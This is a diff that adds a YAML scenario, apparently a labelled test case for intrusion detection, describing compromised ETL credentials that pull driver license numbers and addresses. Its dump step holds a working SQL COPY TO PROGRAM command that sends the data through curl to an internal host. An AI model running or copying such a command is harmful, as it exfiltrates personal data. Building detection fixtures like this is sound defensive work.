@@ -1,0 +1,26 @@
+# Leak 3 (endpoint), matched pair (malicious half): compromised
+# partner_etl_service credentials -- same role, same process shape and
+# timing as the benign half -- but the query broadens to sensitive PII
+# columns across a join and the COPY destination pivots to an INTERNAL
+# 10.x host instead of the documented external customs gateway.
+scenario_id: logistics_run03_partner_etl_pivot_pair_mal_01
+family_id: logistics_run03_partner_etl_pivot_pair
+domain: logistics
+matched_pair_id: logistics_run_03_partner_pivot_01
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content, connects_to_destination]
+time_of_day: "22:45"
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+  - session_label: sync
+    role: partner_etl_service
+    anchor: db
+    timing:
+      tempo: off_hours
+      step_gaps_seconds: [5.0]
+    events:
+      - step_id: dump
+        sql: "COPY (SELECT license_number, home_address, dest_address FROM drivers JOIN shipments ON drivers.driver_id = shipments.driver_id) TO PROGRAM 'curl -s http://10.5.20.9/sync -d @- > /tmp/etl_pivot.log'"
+        connects_to: {ip: "10.5.20.9", port: 8080}
